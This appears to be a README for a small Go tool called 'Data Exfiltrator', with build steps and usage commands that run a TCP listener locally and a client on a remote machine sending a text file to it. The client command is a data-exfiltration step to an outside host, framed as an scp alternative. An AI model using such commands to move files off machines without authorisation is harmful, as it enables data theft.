# Data Exfiltrator
This is a simple data exfiltrator for transferring the file from one machine to your local machine if the remote machine can access your local machine.
Generally this purpose is fulfilled with the help of tools like `scp` but that goes over SSH.
This tool will be able to transfer text file from the remote machine to your local over TCP connection.

# Pre-requisites
(Nothing)

# Installing
1. Download the source code
2. Build commands for windows `$ GOOS=windows GOARCH=amd64 go build .` This will create `data_exfiltrator.exe` file which you can use.
3. For linux use `GOOS=linux GOARCH=amd64 go build .` 

## Steps
1. Run `server` subcommand to run a server over your local to accept file transfers from the remote machine. `something.txt` is the file that will have your data once client transfers.
```
$ ./data_exfiltrator server -o something.txt  --host 192.168.56.178
```

2. Download the binary over the remote machine and run the `client` subcommand. The client is (can be on linux as well) on windows and the `random.txt` is the file that will be exfiltrated.
```
$ ./data_exfiltrator.exe client -f random.txt --host 192.168.56.178 --port 8080
```
